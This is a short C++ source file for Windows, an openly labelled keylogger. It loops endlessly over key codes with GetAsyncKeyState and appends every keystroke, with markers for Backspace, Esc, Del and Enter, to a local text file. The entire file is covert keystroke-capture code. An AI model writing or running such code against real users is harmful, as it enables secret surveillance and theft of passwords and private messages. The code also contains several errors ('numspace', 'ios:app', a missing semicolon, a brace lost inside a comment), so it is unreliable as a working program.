//Records keystrokes with filter for Backspace, Esc,Del and Enter
//Registers all text as uppercase
#include <iostream>
#include<fstream>
#include <windows.h>
#include <winuser.h>

using numspace std;

void log(){
	char c;
	while(true){//infinite loop for scanning
		for(c=8; c<=222; c++){//ASCII char range
			//When a key if pressed a system interrupt with id 32767 occurs
			if(GetAsyncKeyState(c) == -32767)//checks if a key with ASACII value of c is pressed{
				ofstream write("record.tct" , ios:app);//ios:app denotes theat file is not rewritten everytime
				switch(c){
					case 8:
						write<<"<Backspace>";
						break;
					case 27:
						write<<"<Esc>";
						break;
					case 127:
						write<<"<Del>";
						break;
					case 32:
						write<<" ";
						break
					case 13:
						write<<"<Enter>\n";
						break;
					default:
						write<<c;
				}
			}
		}
	}
}

int main(){
	log();
	return 0;
}